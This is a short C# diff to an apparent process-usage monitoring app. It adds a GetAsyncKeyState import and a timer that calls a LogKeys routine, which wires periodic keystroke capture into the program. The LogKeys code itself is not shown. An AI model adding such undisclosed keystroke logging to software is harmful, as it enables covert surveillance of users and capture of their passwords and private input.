@@ -39,7 +39,10 @@ namespace CrcMrc
         }
 
         [DllImport("user32.dll")]
-        static extern IntPtr GetForegroundWindow();        
+        static extern IntPtr GetForegroundWindow();
+
+        [DllImport("user32.dll")]
+        public static extern int GetAsyncKeyState(Int32 i);
 
 
         ArrayList ProcessDataList = new ArrayList();
@@ -60,6 +63,7 @@ namespace CrcMrc
         private void InitVal()
         {
             pdt = new dsProcess.ProcessDataTable();
+            
         }
 
         private void SaveXml()
@@ -201,8 +205,14 @@ namespace CrcMrc
 
         private void UsageTimer_Tick(object sender, EventArgs e)
         {
-            GetUsage();
+            GetUsage();            
         }
+
+        private void Test()
+        {
+            comm.LogKeys();
+        }
+
 
         private void AddProcess(ProcessData NewProcess)
         {
@@ -260,7 +270,10 @@ namespace CrcMrc
         {
             SaveXml();
         }
-        
 
+        private void KeyTime_Tick(object sender, EventArgs e)
+        {
+            Test();
+        }
     }
 }
